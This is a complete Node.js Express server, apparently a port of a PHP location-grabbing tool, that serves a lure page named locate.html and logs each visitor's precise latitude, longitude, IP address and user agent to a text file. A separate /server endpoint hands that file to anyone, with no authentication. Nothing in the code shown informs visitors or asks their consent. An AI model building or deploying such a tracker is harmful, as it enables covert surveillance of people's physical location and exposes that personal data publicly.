const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files (locate.html, etc.) from the current directory
app.use(express.static(path.join(__dirname)));

// Serve locate.html at the root URL to prevent "Cannot GET /" error on Render
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "locate.html"));
});

// Store endpoint — replaces store.php
app.get("/store", (req, res) => {
    const { lat, long, uagent } = req.query;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const timestamp = new Date().toLocaleString();

    if (!lat || !long) {
        return res.status(400).json({ error: "Missing lat or long" });
    }

    const data =
        "=== Location Data ===\n" +
        "Latitude:    " + lat + "\n" +
        "Longitude:   " + long + "\n" +
        "IP:          " + ip + "\n" +
        "User Agent:  " + (uagent || "N/A") + "\n" +
        "Timestamp:   " + timestamp + "\n" +
        "============================\n\n";

    // Append to location.txt (creates file if it doesn't exist)
    const filePath = path.join(__dirname, "location.txt");

    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error("❌ Error writing file:", err);
            return res.status(500).json({ error: "Failed to save location" });
        }

        console.log("✅ Location saved:");
        console.log("   Lat:", lat, "| Long:", long, "| IP:", ip);

        res.json({ success: true, message: "Location saved!" });
    });
});

// Endpoint to view saved locations
app.get("/server", (req, res) => {
    const filePath = path.join(__dirname, "location.txt");
    // Check if the file exists before sending to avoid errors if no location is logged yet
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send("No location data recorded yet.");
    }
});

app.listen(PORT, () => {
    console.log("================================================");
    console.log("  🌍 Geolocate Server Running!");
    console.log("  📡 Open: http://localhost:" + PORT + "/locate.html");
    console.log("================================================");
});
